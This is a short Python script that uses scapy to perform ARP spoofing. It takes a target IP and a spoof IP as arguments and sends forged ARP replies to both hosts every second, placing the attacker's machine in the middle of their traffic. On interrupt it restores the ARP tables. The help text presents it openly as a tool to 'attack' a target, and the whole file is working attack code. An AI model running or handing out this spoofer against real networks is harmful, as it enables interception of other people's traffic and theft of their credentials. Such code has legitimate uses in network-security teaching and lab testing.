#!/usr/bin/env python3


import scapy.all as scapy
import optparse
import time


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="[+] This is the desired Target to Attack ")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="[+] This is the Spoof IP ")
    (options, arguments) = parser.parse_args()
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoofer(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet_2 = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
    packet_list = [packet, packet_2]
    scapy.send(packet_list, verbose=False)


def reset(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    packet_2 = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
    packet_list = [packet, packet_2]
    scapy.send(packet_list, verbose=False, count=4)


options = get_arguments()
packet_count = 0
try:
    while True:
        spoofer(options.target_ip, options.spoof_ip)
        packet_count = packet_count + 2
        print("\r[+] Packets Sent: " + str(packet_count))
        time.sleep(1)
except KeyboardInterrupt:
    print("\r[+] Resetting ARP Tables... ", end=""), time.sleep(1)
    reset(options.target_ip, options.spoof_ip)
    print("\r[+] ARP Tables Reset... ......", end=""), time.sleep(1)
    print("\r[+] Quitting...                  "), time.sleep(1)
